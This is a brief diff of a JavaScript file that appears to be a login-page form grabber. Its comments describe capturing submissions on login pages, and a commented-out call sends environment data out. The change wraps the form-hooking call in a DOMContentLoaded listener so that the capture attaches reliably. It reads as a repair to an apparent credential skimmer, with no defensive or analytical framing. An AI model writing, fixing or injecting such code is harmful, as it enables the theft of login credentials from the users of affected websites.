@@ -88,5 +88,8 @@ function hookForms() {
   // sendData(envInfo, 'initial');
   
   // Hook into forms to capture submissions only on login pages
-  hookForms();
+  // Wait for DOM to be fully loaded before hooking forms
+  document.addEventListener('DOMContentLoaded', function() {
+    hookForms();
+  });
 })();
